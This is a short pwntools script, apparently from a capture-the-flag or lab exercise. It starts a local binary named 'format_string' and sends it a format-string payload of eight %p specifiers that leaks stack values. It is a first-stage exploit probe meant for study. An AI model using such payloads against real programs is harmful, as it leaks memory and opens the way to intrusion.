from pwn import *

# set binary path
context.binary = "../build/format_string"
elf = context.binary

sh = process()

# get prompt text
text = sh.recvuntil("input:".encode())
print("prompt: ", text.decode())

# send payload
payload = "aaaaaaaa %p %p %p %p %p %p %p %p".encode()

sh.sendline(payload)

sh.interactive()